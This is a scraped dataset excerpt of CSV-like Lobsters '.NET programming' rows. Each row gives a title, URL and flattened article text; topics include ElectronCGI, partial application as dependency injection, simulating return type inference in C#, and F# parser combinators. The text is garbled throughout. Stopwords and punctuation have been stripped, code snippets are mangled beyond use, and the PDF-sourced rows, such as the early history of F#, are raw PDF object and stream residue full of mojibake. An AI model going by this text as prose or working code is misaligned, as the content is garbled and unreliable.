parent r prev r next r first r last r count endobj obj title figure lcc compilation pipeline traditional environment dest parent r next r endobj obj title figure lccnet compilation pipeline dest parent r prev r endobj obj title common intermediate language dest parent r prev r next r first r last r count endobj obj title figure lcc tree ir generic operator dest parent r next r endobj obj title figure lcc codegeneration function dest parent r prev r endobj obj title table msil type dest parent r endobj obj uri uri http wwwresearchmicrosoftcom type annot subtype link rect border endobj obj procset pdf text font r r r extgstate r colorspace r endobj obj type fontdescriptor ascent capheight descent flag fontbbox fontname iaalkktimesnewroman bold italicangle stemv r endobj obj type font subtype truetype firstchar lastchar width encoding winansiencoding basefont iaaljitimesnewroman fontdescriptor r endobj obj type fontdescriptor ascent capheight descent flag fontbbox fontname iaaljitimesnewroman italicangle stemv xheight r endobj obj type font subtype truetype firstchar lastchar width encoding winansiencoding basefont iaalkktimesnewroman bold fontdescriptor r endobj obj iccbased r endobj obj length filter flatedecode stream cf xr di xz b x
66,Lobsters,dotnet,"C#, F#, .NET programming",ElectronCGI 1.0 - Cross-platform GUIs for .Net Core,https://www.blinkingcaret.com/2020/03/25/electroncgi-1-0-cross-platform-guis-for-net-core/,electroncgi crossplatform gui net core,electroncgi electroncgidotnet electroncgi cross platform net core gui electron electroncgi solution crossplatform gui net core window store app mvvm version error propagation memory ace programming window apps c xaml making window store memory ace github twitter github,happy share version electroncgi know electroncgi twopart library allows invoking net code nodejs nodejs code net two part comprised npm package called electroncgi nuget package called electroncgidotnet electroncgi useful allows leverage tool like electron build ui desktop application still nonui code written using net electroncgi different existing alternative example electronnet electrongcgi rely http communication electroncgi net process launched maintained connection connection established using process stdin stdout stream provided o almost boilerplate required motivating force net core cross platform good story regarding gui outside window blog post focus change new feature version want indepth introduction electroncgi find two blog post electroncgi cross platform net core gui electron electroncgi solution crossplatform gui net core also end blog post brief description indepth latter blog post electroncgi allowed port window store app built using mvvm making cross platform nonui code reuse version biggest breaking change version introduces related callback signature version callback follow nodejs convention error object first argument result second argument previously connectionsend requesttype args response use response connectionsend requesttype args err response err handle err return use response alternatively omit callback send return promise write try const result await connectionsend requesttype args use result catch err handler err lead u second main improvement version electroncgi error propagation error propagation previous version exception handler net net process would crash error would written log file logging enabled version exception serialized sent nodejs process example handler net connectionon greet string name stringisnullorempty name throw new argumentexception name required name return hello name request performed nodejs connectionsend greet err re err err net exception consolelog errmessage name required using async await try const greeting await connectionsend greet catch err consolelog errmessage chance handle error importantly connection remain open memory ace memory ace application created window store around read charles petzold programming window apps c xaml book time excitement window store idea pushed apps audience billion user even developer claiming making window store guess time microsoft pumping ad money kick store missed wave never made pocket change memory ace first app created way found make familiar platform looking back would never even remotely popular game memorize full deck card yes right want least amount time sound like something lot fun agree probably mindful exercise practice although study know support probably improves memory anyway interesting thing memory ace follows recommendation charles petzold book us view model view model dependency anything platform specific ie opening file dialog etc able port view model linux using electroncgi recreate ui used react look gif captured ubuntu look memory ace github readme file instruction run give confidence call version electroncgi able comfortably develop port without issue even pleasant development experience go much detail step planning write another blog post summarize order use view model electroncgi case familiar concept viewmodel idea viewmodel encapsulates data model displayed view also behavior happen click button view example way materialized window store apps wpf viewmodels implement interface named inotifypropertychanged thing interface defines event named propertychanged idea property viewmodel change propertychanged event raised name property changed view listens event allows data binding happen change made viewmodel property view notified update action performed user view icommand interface button window app universal window platform wpf configured run instance icommand stored viewmodel executing command update property viewmodel turn lead view updated icommand defines two method canexecute object parameter return boolean indicates command executed execute object parameter actually executes command also defines event canexecutechanged view us known call canexecute example memory ace viewmodel vm named memorizationviewmodel one property list memorized card named cardsmemorized another property currentcard card displayed memorization area example command turncard turn card add cardsmemorized also set currentcard card turned use vm electroncgi need send request net nodejs property change look like currentcard memorizationpageviewmodelpropertychanged propertychangedeventargs switch propertychangedeventargspropertyname case currentcard connectionsend memorizationcurrentcard memorizationpageviewmodelcurrentcard break cardsmemorized observablecollection collection raise event element addedremoved memorizationpageviewmodelcardsseencollectionchanged e args connectionsend memorizationcardsseen memorizationpageviewmodelcardsseen side connection case react app running inside electron need handle event update ui simplified version look like using react function component usestate hook const currentcard setcurrentcard usestate const cardsseen setcardsseen usestate connectionon memorizationcurrentcard err newcurrentcard handle error exists setcurrentcard newcurrentcard connectionon memorizationcardsseen err cardsseen handle error exists setcardsseen cardsseen command action triggered ui concrete example click handler react application running electron async function turncard try await connectionsend memorizationturncard catch err handle error net connectionon memorizationturncard memorizationpageviewmodelturncardcommandcanexecute null memorizationpageviewmodelturncardcommandexecute null basically complication course namely deploy thing get shuffled around use packager like electronpackager app also thing related electron like example expose connection render process react app running planning write blog post detailing future meanwhile follow twitter tweet new post ready also star project github try add issue question find something broken related
68,Lobsters,dotnet,"C#, F#, .NET programming",Partial application is dependency injection,https://blog.ploeh.dk/2017/01/30/partial-application-is-dependency-injection/,partial application dependency injection,dependency injection dependency rejection dependency injection net attempted dependency injection using function previous article application consider alternative equivalence evaluation previously shown example similar one pure summary next dependency rejection,equivalent dependency injection f partial function application nt functional second article small article series called dependency injection dependency rejection people often ask dependency injection f natural since wrote dependency injection net year ago also since increasingly focused energy f functional programming language year seen f expert respond question often answer partial function application f way dependency injection year believed well turn true one sense incorrect another partial application equivalent dependency injection functional solution dealing dependency clear claiming partial application nt functional claim partial application used dependency injection nt functional attempted dependency injection using function returning example previous article could try rewrite maîtredtryaccept function int datetimeoffset reservation list reservation int reservation int option let tryaccept capacity readreservations createreservation reservation let reservedseats readreservations reservationdate listsumby fun x xquantity reservedseats reservationquantity capacity createreservation reservation isaccepted true else none could imagine tryaccept function part module called maîtred keep example equivalent possible function take four argument first capacity restaurant question primitive integer next two argument readreservations createreservation fill role injected ireservationsrepository previous article objectoriented example tryaccept method used two method repository readreservations create instead using interface f function make function take two independent function almost type c counterpart first three argument correspond injected dependency previous maîtred class fourth argument reservation value corresponds input previous tryaccept method instead returning nullable integer f version return int option implementation also equivalent c example read relevant reservation database using readreservations function argument sum quantity based number already reserved seat decide whether accept reservation accept reservation set isaccepted true call createreservation function argument pipe returned id integer ca nt accept reservation return none notice first three argument dependency whereas last argument actual input mean use partial function application compose function application recall definition previous imaîtred interface tryaccept method defined like c code snippet int tryaccept reservation reservation could attempt define similar function type reservation int option normally want closer boundary application following example demonstrates inject real database operation function imagine db module function module db string datetimeoffset reservation list let readreservations connectionstring date string reservation int let createreservation connectionstring reservation readreservations function take connection string date argument return list reservation date createreservation function also take connection string well reservation invoked creates new record reservation return id newly created row sort api violates cqs consider alternative partially apply function valid connection string type desired role tryaccept mean create function element reservation int option let tryacceptcomposition let read dbreadreservations connectionstring let create dbcreatereservation connectionstring tryaccept read create notice tryaccept partially applied argument corresponding c dependency passed return value function wait last argument reservation attempted indicate code comment function desired type reservation int option equivalence partial application used like equivalent dependency injection see consider generated intermediate language il f net language compiles il decompile il c get sense going tryacceptcomposition get something like internal class tryacceptcomposition fsharpfunc reservation fsharpoption int public int capacity public fsharpfunc reservation int createreservation public fsharpfunc datetimeoffset fsharplist reservation readreservations internal tryacceptcomposition int capacity fsharpfunc datetimeoffset fsharplist reservation readreservations fsharpfunc reservation int createreservation thiscapacity capacity thisreadreservations readreservations thiscreatereservation createreservation public override fsharpoption int invoke reservation reservation return maîtredtryaccept int thiscapacity thisreadreservations thiscreatereservation reservation cleaned bit mostly removing attribute various element notice class class field constructor take value field assigns constructor injection partial application dependency injection compiles work expected functional evaluation people sometimes ask know whether f code functional sometimes wonder unfortunately nice language f nt offer much help regard emphasis functional programming allows mutation objectoriented programming even procedural programming friendly forgiving language also make great beginner functional language learn functional concept piecemeal haskell hand strictly functional language haskell write code functional way fortunately f haskell similar enough easy port f code haskell long f code already sufficiently functional order evaluate f code properly functional sometimes port haskell get compile run haskell take confirmation code functional previously shown example similar one repeat experiment porting tryaccept tryacceptcomposition haskell work easy port tryaccept tryaccept int zonedtime reservation reservation int reservation maybe int tryaccept capacity readreservations createreservation reservation let reservedseats sum map quantity readreservations date reservation reservedseats quantity reservation capacity createreservation reservation isaccepted true else nothing clearly difference sure also see similarity important feature function pure haskell function pure default unless explicitly declared impure case function pure readreservations createreservation haskell version tryaccept compiles tryacceptcomposition like f code experiment see possible inject function actually operate database equivalent f example imagine db module readreservations connectionstring zonedtime io reservation readreservations connectionstring date createreservation connectionstring reservation io int createreservation connectionstring reservation database operation definition impure haskell admirably model type system notice function return io value partially apply function valid connection string io context remains type dbreadreservations connectionstring zonedtime io reservation type dbcreatereservation connectionstring reservation io int try pas tryaccept type nt match tryacceptcomposition reservation io maybe int tryacceptcomposition reservation let read dbreadreservations connectionstring create dbcreatereservation connectionstring tryaccept read create reservation nt compile nt compile database operation impure tryaccept want pure function short partial application used dependency injection nt functional summary partial application f used achieve result equivalent dependency injection compiles work expected functional reason functional dependency nature impure either nondeterministic sideeffects often underlying reason factored dependency first place pure function however ca nt call impure function could would become impure rule enforced haskell f inject impure operation f function function becomes impure well dependency injection make everything impure explains nt functional functional programming solves problem decoupling side effect program logic another way topic next article next dependency rejection
69,Lobsters,dotnet,"C#, F#, .NET programming",The Early History of F#,https://fsharp.org/history/hopl-final/hopl-fsharp.pdf,early history f,,obj length filter flatedecode stream p jbd c e endstream endobj obj length filter flatedecode stream w endstream endobj obj length filter flatedecode stream endstream endobj obj goto section endobj obj endobj obj goto section endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto endobj obj endobj obj goto section endobj obj endobj obj goto section endobj obj endobj obj goto r fit endobj obj length filter flatedecode stream xڥy n f h v xz b ܬ l f l endstream endobj obj type page content r resource r mediabox parent r annots r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r r r procset pdf text endobj obj length filter flatedecode stream ka 跮h t矘 r endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto section endobj obj type annot subtype link border hic rect goto section endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto section endobj obj type annot subtype link border hic rect goto section endobj obj r xyz null endobj obj r xyz null endobj obj font r r r procset pdf text endobj obj length filter flatedecode stream z hj v ԑ f qm v mj mk sɾ uuvz 㾧 x qd qg n eo w h h endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citeblasuccifsharphistory endobj obj type annot subtype link border hic rect goto citeblasuccifsharphistory endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r procset pdf text endobj obj length filter flatedecode stream u mj p x jja x v endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citefsharptestimonials endobj obj type annot subtype link border hic rect goto citefsharptestimonials endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r procset pdf text endobj obj length filter flatedecode stream soxyյ p x rp v ԭt id r b ݪc w e f dd endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citemicrosofthistorywikipedia endobj obj type annot subtype link border hic rect goto citemicrosofthistorywikipedia endobj obj type annot subtype link border hic rect goto citerefmort endobj obj type annot subtype link border hic rect goto citerefmort endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citerefhypercard endobj obj type annot subtype link border hic rect goto citerefhypercard endobj obj type annot subtype link border hic rect goto citereftoolbook endobj obj type annot subtype link border hic rect goto citereftoolbook endobj obj type annot subtype link border hic rect goto citereffoxpro endobj obj type annot subtype link border hic rect goto citereffoxpro endobj obj type annot subtype link border hic rect goto citereffortran endobj obj type annot subtype link border hic rect goto citereffortran endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r procset pdf text endobj obj length filter flatedecode stream c yip r c quw j e g endstream endobj obj type page content r resource r mediabox parent r annots r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r procset pdf text endobj obj length filter flatedecode stream p lvo fߋ ݬ ouwwxeg v اl v j g ʧ r k dݩgnx h endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r procset pdf text endobj obj length filter flatedecode stream xڥ q h c e g v kc q k x endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citerabhgorlatch endobj obj type annot subtype link border hic rect goto citerabhgorlatch endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citefdiv endobj obj type annot subtype link border hic rect goto citefdiv endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citerefassange endobj obj type annot subtype link border hic rect goto citerefassange endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r procset pdf text endobj obj length filter flatedecode stream xڝz j ēф l p tz endstream endobj obj type page content r resource r mediabox parent r group r annots r r r r r r r r r r r r endobj obj type xobject subtype image width height bitspercomponent colorspace devicergb smask r length filter flatedecode stream 퉤 g llh ʃ
70,Lobsters,dotnet,"C#, F#, .NET programming",Simulating Return Type Inference in C#,https://tyrrrz.me/blog/return-type-inference,simulating return type inference c,type inference option type result type summary,everything else software development really enjoy building framework enable developer create something cool sometimes chasing perfect design mind find coming weird hack really push c language limit one case happened long ago coworker looking avoid specifying generic argument place compiler seemingly able guess based return type said impossible seeing c infer generic argument method parameter however able come way prove wrong article show little trick came simulate return type inference well example useful type inference type inference general ability compiler automatically detect type particular expression without programmer explicitly specify feature work analyzing context expression evaluated well constraint imposed flow data program able detect type automatically language support type inference allow writing succinct code still maintaining full benefit static type system mainstream statically typed language type inference one form another c one language type inference well simplest possible example var keyword var x var foo var z var g guidnewguid combined declaration assignment operation var keyword need specify type variable compiler able detect based expression right side similar vein c also allows initializing array without manually specify type var array new hello world case compiler see initializing array two string element safely conclude resulting array type string rare case even infer type array based specific common type among individual element var array new however interesting aspect type inference c course generic method calling method generic signature omit type argument long deduced value passed method parameter example define generic method listcreate creates list sequence element public static class list public static list create params item new list item turn used like var list listcreate scenario could specified type explicitly writing listcreate int compiler able detect automatically based parameter passed method constrained type returned list interestingly enough example shown fact based form type inference work analyzing constraint imposed expression whose type already known word examines flow data go draw conclusion data go scenario however may want type inference work opposite direction let see could useful option type writing code functional style likely intimately familiar option type container encapsulates single value absence thereof allows u perform various operation content without actually observing state c option type usually defined encapsulating two field generic value flag indicates whether value actually set could look something like public readonly struct option private readonly value private readonly bool hasvalue private option value bool hasvalue value value hasvalue hasvalue public option value value true public tout match tout func tout func tout none hasvalue value none public void match action action none hasvalue value else none public option tout select tout func tout map hasvalue new option tout map value new option tout public option tout bind tout func option tout bind hasvalue bind value new option tout api design fairly basic implementation hide actual value away consumer surfacing match method unwraps container handling potential state additionally select bind method used safely transform value regardless whether actually set also example option defined readonly struct seeing mainly returned method used local scope decision make sense performance point view make thing convenient may also want provide factory method help construct new instance option fluent manner public static class option public static option value new option value public static option none new option used like public static option int parse string number return inttryparse number var value optionsome value optionnone int see case optionsome drop generic argument compiler infer based type value int hand work optionnone parameter hence need specify type manually even though type argument optionnone seems inherently obvious context compiler able deduce mentioned earlier type inference c work analyzing data flow way around course ideally would want compiler figure type optionnone based return type expression expected dictated signature containing method would want least get first branch conditional expression already inferred value unfortunately neither possible c type system would need work type reverse said help little bit simulate return type inference optionnone return special nongeneric type representing option deferred initialization coerced option would look public readonly struct option private readonly value private readonly bool hasvalue private option value bool hasvalue value value hasvalue hasvalue public option value value true public static implicit operator option noneoption none new option public readonly struct noneoption public static class option public static option value new option value public static noneoption none get new noneoption see optionnone return dummy noneoption object essentially represents empty option whose type decided yet noneoption generic able drop generic argument turn optionnone property additionally made option implement implicit conversion noneoption although operator generic c still retain type argument declaring type allows u define conversion every possible variant option allows u write optionnone compiler coerce automatically destination type consumer point view look though implemented return type inference public static option int parse string number return inttryparse number var value optionsome value optionnone result type like option may want apply treatment result tok terror type fulfills similar purpose except also fully fledged value representing negative case instead empty could implement public readonly struct result tok terror private readonly tok ok private readonly terror error private readonly bool iserror private result tok ok terror error bool iserror ok ok error error iserror iserror public result tok ok ok default false public result terror error default error true public static class result public static result tok terror ok tok terror tok ok new result tok terror ok public static result tok terror error tok terror terror error new result tok terror error would used public static result int string parse string input return inttryparse input var value resultok int string value resulterror int string invalid value see situation regarding type inference even dire neither resultok tok terror resulterror tok terror enough parameter infer generic argument forced specify manually case write type every time lead visual noise code duplication bad developer experience general let try rectify using technique earlier public readonly struct result tok terror private readonly tok ok private readonly terror error private readonly bool iserror private result tok ok terror error bool iserror ok ok error error iserror iserror public result tok ok ok default false public result terror error default error true public static implicit operator result tok terror delayedresult tok ok new result tok terror okvalue public static implicit operator result tok terror delayedresult terror error new result tok terror errorvalue public readonly struct delayedresult public value get public delayedresult value value value public static class result public static delayedresult tok ok tok tok ok new delayedresult tok ok public static delayedresult terror error terror terror error new delayedresult terror error similarly defined delayedresult represents initialized part result tok terror using implicit conversion operator coerce delayed instance destination type enables u rewrite code like public static result int string parse string input return inttryparse input var value result int string resultok value resulterror invalid value bit better ideal problem conditional expression c coerce branch directly expected type instead try convert type negative branch type positive branch need explicitly cast positive branch result int string specify common denominator however issue completely avoided use conditional statement instead public static result int string parse string input inttryparse input var value return resultok value return resulterror invalid value much satisfied setup able drop generic argument entirely maintaining signature type safety highlevel perspective may look generic argument somehow inferred expected return type however may noticed bug implementation type tok terror ambiguity state delayedresult actually represents example imagine using result type following scenario public interface itranslationservice task bool islanguagesupportedasync string language task string translateasync string text string targetlanguage public class translator private readonly itranslationservice translationservice public translator itranslationservice translationservice translationservice translationservice public async task result string string translateasync string text string language await translationserviceislanguagesupportedasync language return resulterror language language supported var translated await translationservicetranslateasync text language return resultok translated resulterror terror resultok tok return delayedresult string compiler struggle figure convert expression type delayedresult string return type result string string luckily fix simple need represent individual state separately public readonly struct result tok terror private readonly tok ok private readonly terror error private readonly bool iserror private result tok ok terror error bool iserror ok ok error error iserror iserror public result tok ok ok default false public result terror error default error true public static implicit operator result tok terror delayedok tok ok new result tok terror okvalue public static implicit operator result tok terror delayederror terror error new result tok terror errorvalue public readonly struct delayedok public value get public delayedok value value value public readonly struct delayederror public value get public delayederror value value value public static class result public static delayedok tok ok tok tok ok new delayedok tok ok public static delayederror terror error terror terror error new delayederror terror error going back code earlier work exactly expected public class translator private readonly itranslationservice translationservice public translator itranslationservice translationservice translationservice translationservice public async task result string string translateasync string text string language await translationserviceislanguagesupportedasync language return resulterror language language supported var translated await translationservicetranslateasync text language return resultok translated summary although type inference c limit push bit help implicit conversion operator using simple trick shown article simulate return type inference enabling potentially interesting design opportunity
71,Lobsters,dotnet,"C#, F#, .NET programming",Understanding Parser Combinators,https://fsharpforfunandprofit.com/posts/understanding-parser-combinators/,understanding parser combinators,slide video talk topic second post third post last post fparsec implementation parsing hardcoded character implementation parsing specified character implementation returning successfailure functional error handling implementation switching curried implementation currying rewriting inner function benefit curried implementation partially apply implementation encapsulating parsing function type testing wrapped function combining two parser sequence combinator functional programming pattern testing choosing two parser combinator testing combining choosing list parser see post monoids review listing parser library far gist summary next post gist information fparsec library understanding parser combinators series comment comment powered disqus blog comment powered,part understanding parser combinators series update slide video talk topic series look socalled work order understand something nothing like building create basic parser library scratch useful finish building complete json parser term like make approach seem complicated rather attempting explain concept front dive start coding build complex stuff incrementally via series implementation implementation slightly different previous one using approach hope stage design concept easy understand end series parser combinators become completely demystified four post series first post look basic concept parser combinators build core library second post build useful library combinators third post work providing helpful error message last post build json parser using parser library obviously focus performance efficiency hope give understanding enable use library like fparsec effectively way big thank stephan tolksdorf created fparsec make first port call net parsing need implementation parsing hardcoded character first implementation create something par single hardcoded character case letter get much simpler work input parser stream character could use something complicated use string stream empty return pair consisting false empty string first character stream return pair consisting true remaining stream character first character stream return false unchanged original stream character code let aparser str stringisnullorempty str false else str let remaining str true remaining else false str signature aparser val aparser string bool string tell u input string output pair consisting boolean result another string remaining input like test first good input let inputabc abc aparser inputabc result see consumed remaining input bc bad input let inputzbc zbc aparser inputzbc give result case first character consumed remaining input still zbc incredibly simple parser understand everything follows easy implementation parsing specified character refactor pas character want match rather hard coded time rather returning true false return message indicating happened call function pchar code let pchar chartomatch str stringisnullorempty str let msg input msg else let first str first chartomatch let remaining str let msg sprintf found c chartomatch msg remaining else let msg sprintf expecting c got c chartomatch first msg str code like previous example except unexpected character shown error message signature pchar val pchar char string string string tell u input pair string character match output pair consisting string result another string remaining input test first good input let inputabc abc pchar inputabc result consumed remaining input bc bad input let inputzbc zbc pchar inputzbc give result expecting got z zbc first character consumed remaining input still zbc pas z parser succeed pchar z inputzbc found z bc implementation returning successfailure want able tell difference successful match failure returning stringlytyped message helpful define special type indicate difference call result type result success failure string success case generic contain value failure case contains error message note using successfailure approach see talk functional error handling rewrite parser return one result case like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg signature pchar val pchar char string result char string tell u output result success case contains matched char remaining input string test first good input let inputabc abc pchar inputabc result consumed remaining input bc also get actual matched char case bad input let inputzbc zbc pchar inputzbc give result failure expecting got z case failure case returned appropriate error message diagram input output implementation switching curried implementation previous implementation input function tuple pair requires pas input functional language like f idiomatic use curried version like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg see difference difference first line even subtle uncurried tuple version let pchar chartomatch str curried version let pchar chartomatch str difference much obvious look type signature signature uncurried tuple version val pchar char string result char string signature curried version val pchar char string result char string curried version pchar represented diagram currying unclear currying work post basically mean multiparameter function written series oneparameter function word twoparameter function signature val add x int int int written equivalent oneparameter function return lambda like let add x fun x return lambda function return inner function like let add x let innerfn x innerfn return innerfn second case inner function used signature look slightly different val add x int int int parenthesis around last parameter ignored signature practical purpose original one original automatic currying two parameter function val add x int int int explicit currying inner function val add x int int int rewriting inner function take advantage currying rewrite parser oneparameter function parameter chartomatch return inner function new implementation inner function cleverly named innerfn let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return inner function innerfn type signature implementation look like val pchar chartomatch char string result char string functionally equivalent previous version char string result char string word implementation identical caller point view twoparameter implementation let pchar chartomatch str oneparameter implementation inner function let pchar chartomatch let innerfn str return inner function innerfn benefit curried implementation nice curried implementation partially apply character want parse like later supply second parameter let inputabc abc parsea inputabc success bc let inputzbc zbc parsea inputzbc failure expecting got z point stop review going pchar function two input provide one input char match result function returned provide second input stream character parsing function creates final result value diagram pchar time emphasis partial application important understand logic moving rest post build basic design implementation encapsulating parsing function type look parsea example see function type val parsea string result char string type bit complicated use encapsulate type called parser like type parser parser string result string encapsulating go design design change implementation simple need change way inner function returned let pchar chartomatch let innerfn str return inner function innerfn let pchar chartomatch let innerfn str return wrapped inner function parser innerfn testing wrapped function ok test let parsea pchar let inputabc abc parsea inputabc compiler error get compiler error error value function applied course function wrapped parser data structure longer directly accessible need helper function extract inner function run input stream call run implementation run let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input run parsea parser various input let inputabc abc run parsea inputabc success bc let inputzbc zbc run parsea inputzbc failure expecting got z got basic parser type hope make sense far combining two parser sequence combinator last implementation good enough basic parsing logic revisit later move level develop way combining parser together mentioned beginning start combining two parser sequence example say want parser match could try writing something like let parsea pchar let parseb pchar b let parseathenb parsea parseb give u compiler error output parsea match input parseb composed like familiar functional programming pattern need chain sequence wrapped type together like happens frequently solution bind function however case implement bind instead go straight andthen implementation implementation logic follows run first parser failure return otherwise run second parser remaining input failure return parser succeed return pair tuple contains parsed value code andthen let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn implementation follows logic described also define infix version andthen use like regular composition note parenthesis needed define custom operator needed infix usage look signature andthen val andthen parser parser b parser b see work two parser different type b testing andthen test see work first create compound parser let parsea pchar let parseb pchar b let parseathenb parsea parseb look type see three value type parser val parsea parser char val parseb parser char val parseathenb parser char char parseathenb type parser char char meaning parsed value pair char since combined parser parseathenb another parser use run run parseathenb abc success b c run parseathenb zbc failure expecting got z run parseathenb azc failure expecting b got z see success case pair b returned also failure happens either letter missing input choosing two parser combinator look another important way combining parser combinator example say want parser match could combine implementation logic would run first parser success return parsed value along remaining input otherwise failure run second parser original case return result success failure second parser code orelse let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn define infix version orelse well look signature orelse val orelse parser parser parser see work two parser must type testing orelse time test first create combined parser let parsea pchar let parseb pchar b let parseaorelseb parsea parseb look type see three value type parser char val parsea parser char val parseb parser char val parseaorelseb parser char run parseaorelseb see successfully handle first character run parseaorelseb azz success zz run parseaorelseb bzz success b zz run parseaorelseb czz failure expecting b got c combining andthen orelse two basic combinators build complex one b c build aandthenborc simpler parser let parsea pchar let parseb pchar b let parsec pchar c let borelsec parseb parsec let aandthenborc parsea borelsec action run aandthenborc abz success b z run aandthenborc acz success c z run aandthenborc qbz failure expecting got q run aandthenborc aqz failure expecting c got q note last example give misleading error say really say attempt fix right later post implement better error message choosing list parser power combinators start kicking orelse toolbox use build even combinators example say want choose list parser rather two well easy pairwise way combining thing extend combining entire list using reduce working reduce see post monoids choose list parser let choice listofparsers listreduce listofparsers note fail input list empty ignore signature choice val choice parser list parser show u expected input list parser output single parser choice available create anyof parser match character list using following logic input list character char list transformed parser char using pchar finally parser combined using choice code choose list character let anyof listofchars listofchars listmap pchar convert parser choice test creating parser lowercase character digit character let parselowercase anyof z let parsedigit anyof test work expected run parselowercase abc success bc run parselowercase abc failure expecting z got run parsedigit success abc run parsedigit success abc run parsedigit abc failure expecting got error message misleading lowercase letter expected digit expected said earlier work error message later post review stop review done created type parser wrapper parsing function parsing function take input eg string attempt match input using 